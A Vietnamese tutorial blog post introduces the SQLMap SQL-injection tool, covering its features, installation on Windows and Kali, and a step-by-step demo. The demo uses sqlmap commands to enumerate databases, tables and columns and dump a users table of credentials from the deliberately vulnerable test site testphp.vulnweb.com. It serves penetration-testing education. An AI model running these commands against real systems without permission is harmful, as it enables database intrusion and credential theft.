Trước khi đi vào tìm hiểu về SQLMap, các bạn nên nắm được khái niệm về lỗ hổng SQL Injection. Trước đây, mình đã từng có bài viết giới thiệu các khái niệm cơ bản về kiểu tấn công này ở đây\
https://viblo.asia/p/sql-injection-la-gi-co-bao-nhieu-kieu-tan-cong-sql-injection-m68Z0QnMlkG\
Bài viết hôm nay sẽ đề cập tới các tính năng, cách cài đặt và demo đơn giản với công cụ SQLMap

## SQLMap là gì
- SQLMAP là công cụ khai thác những lổ hỏng của cơ sở dữ liệu SQL. Công cụ này được xem là công cụ khai thác SQL tốt nhất hiện nay. Được giới bảo mật và giới hacker sử dụng thường xuyên. Với người dùng Kali hoặc Back Track 5 thì SQLMAP đã được tích hợp sẵn vào hệ điều hành. Riêng Windows thì chúng ta phải cài đặt thêm python và SQLMAP để sử dụng
- Đây là công cụ mã nguồn mở, tự động hóa quá trình phát hiện và khai thác lỗ hổng SQL. Nó đi kèm với một công cụ phát hiện mạnh mẽ, nhiều tính năng thích hợp cho trình kiểm tra thâm nhập cuối cùng 

## Tính năng
-	Hỗ trợ đầy đủ làm việc với các hệ quản trị cơ sở dữ liệu MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, MemSQL, TiDB, CockroachDB, ...
-	Hỗ trợ đầy đủ cho các kỹ thuật tấn công SQL Injection: boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries và out-of-band
-	Kết nối trực tiếp với cơ sở dữ liệu mà không cần thông qua SQL SQL, bằng cách cung cấp thông tin đăng nhập DBMS, địa chỉ IP, cổng và tên cơ sở dữ liệu.
-	Liệt kê người dùng, password hash, đặc quyền, vai trò, cơ sở dữ liệu, bảng và cột.
-	Tự động nhận dạng các định dạng băm mật khẩu và hỗ trợ bẻ khóa chúng bằng cách sử dụng một cuộc tấn công dựa trên từ điển.
-	Trích xuất hoàn toàn các bảng cơ sở dữ liệu, một loạt các mục hoặc các cột cụ thể theo lựa chọn của người dùng
-	Tìm kiếm tên cơ sở dữ liệu cụ thể, các bảng cụ thể trên tất cả các cơ sở dữ liệu hoặc các cột cụ thể trên tất cả các bảng của cơ sở dữ liệu
-	Tải xuống và tải lên bất kỳ tệp nào từ máy chủ cơ sở dữ liệu bên dưới hệ thống tệp khi phần mềm cơ sở dữ liệu là MySQL, PostgreQuery hoặc Microsoft SQL Server.
-	Thực hiện các lệnh tùy ý và truy xuất đầu ra tiêu chuẩn của chúng trên máy chủ cơ sở dữ liệu bên dưới hệ điều hành khi phần mềm cơ sở dữ liệu là MySQL, PostgreQuery hoặc Microsoft SQL Server

## Cách cài đặt
### Window
**Bước 1: Tải file cài đặt Python và SQLMap** \
Link cài đặt Python:
https://www.python.org/ftp/python/2….hon-2.7.10.msi\
Link cài đặt SQLMap:
https://github.com/sqlmapproject/sqlmap/zipball/master

**Bước 2: Cài đặt Python**
Mở file python-2.7.10.msi và chọn “install for all users” sau đó click Next

![](https://images.viblo.asia/a2bfd019-be7c-41af-8fb9-6f8c6459446d.png)

Chọn nơi cài đặt (mặc định là C:\Python27\)
![](https://images.viblo.asia/37bd1473-6eda-4834-b237-fcd1e2a9ea17.png)

Đợi cho chương trình cài đặt và Click Finish để kết thúc
![](https://images.viblo.asia/c7d19dcc-9eb6-4534-b51f-0c477a27e2f8.png)

**Bước 3: Giải nén file sqlmap vừa tải sau đó copy toàn bộ thư mục sqlmap vào đường dẫn C:\Python27**

![](https://images.viblo.asia/7cf9dda2-d5b2-4e2f-8dcd-7ac1f89adde7.png)


Mở cmd và điều hướng tới thư mục vừa lưu SQLMap
![](https://images.viblo.asia/6050c7d0-d90b-45e6-b4b3-35d66ab698cc.png)


Tất cả đã hoàn thành, bây giờ có thể sử dụng sqlmap
![](https://images.viblo.asia/4627d3b7-cbb6-4389-98d3-7ee78ebd7747.png)

### Kali Linux
- SQLMap đã được cài đặt sẵn trong Kali
-  Để sử dụng, vào mục Applications -> Exploitation Tool -> SQLMap hoặc tại Terminal gõ sqlmap

## Các câu lệnh cơ bản
-	Trên windows: 
	sqlmap.py [-u url mục tiêu] [tùy chọn]
-	Trên Kali Linux: 
	sqlmap [-u url mục tiêu] [tùy chọn]
Danh sách đầy đủ các options của SQLMap rất dài, mình sẽ để link ở đây cho mọi người tham khảo:
https://github.com/sqlmapproject/sqlmap/wiki/Usage

## Demo
Trong demo này, chúng ta sẽ thử tìm cách lấy được thông tin đăng nhập vào trang Web:  http://testphp.vulnweb.com/ (Đây là trang Web demo nên các bạn có thể thử thoải mái nhé)

![](https://images.viblo.asia/9bf8a9f1-d395-45df-8ad4-119b4d56abb9.png)

**Bước 1: Mở teminal và gõ lệnh như sau:**\
sqlmap –u”http://testphp.vulnweb.com/search.php?test=query”\
u: là url của mục tiêu\
SQLMap sẽ phát hiện lỗ hổng của mục tiêu vào đưa ra thông tin về lỗ hổng.

![](https://images.viblo.asia/91ab3a6c-fe9d-49a6-b618-9f6da97fc26a.png)


**Bước 2: Khi đã xác định được là website mục tiêu tồn tại lỗ hổng SQL injection, ta tiến hành tìm tên cơ sở dữ liệu**\
python sqlmap.py –u “http://testphp.vulnweb.com/search.php?test=query” –dbs\
dbs là option để liệt kê các cơ sở dữ liệu của website

![](https://images.viblo.asia/83e41902-9a76-4352-99be-d87b56a2187a.png)


**Bước 3: Sau khi xác định được tên cơ sở dữ liệu, ta sẽ tìm tiếp tên các bảng có trong cơ sở dữ liệu**\
sqlmap -u"http://testphp.vulnweb.com/search.php?test=query" --tables -D acuart\
Option – tables để liệt kê tất cả các bảng có trong cơ sở dữ liệu\
Option –D là tên cơ sở dữ liệu cần liệt kê bảng\
Câu lệnh trên để liệt kê các bảng trong cơ sở dữ liệu acuart
![](https://images.viblo.asia/7b3d6bc3-2360-464a-bc78-ff9316f58171.png)

**Bước 4: Xác định tên các cột trong bảng**\
Ta thấy table user có thể chứa thông tin đăng nhập nên ta sử dụng lệnh sau để xác định tên các cột trong bảng user\
sqlmap -u"http://testphp.vulnweb.com/search.php?test=query" --columns -D acuart -T users\
Option –columns để liệt kê ra các cột trong bảng
Option –D tên csdl
Option –T tên bảng cần liệt kê các cột
Câu lệnh liệt kê các trường của bảng user trong csdl acuart

![](https://images.viblo.asia/ae769097-9162-4593-8a88-f0b1161967dd.png)

Trong bản users có các trường uname và pass khả năng cao chưa tên tài khoản và mật khẩu để đăng nhập vào hệ thống

**Bước 5: Lấy dữ liệu trong bảng**\
sqlmap -u"http://testphp.vulnweb.com/search.php?test=query" --dump -D acuart -T users\
Câu lệnh trên để lấy ra các bản ghi của bảng users

![](https://images.viblo.asia/a69063dc-7e9b-43d2-87b6-fa929fd36ab1.png)

Bảng users có 1 bản ghi chứa thông tin của username và password là "test", "test"
Sử dụng tài khoản này, ta sẽ đăng nhập vào được hệ thống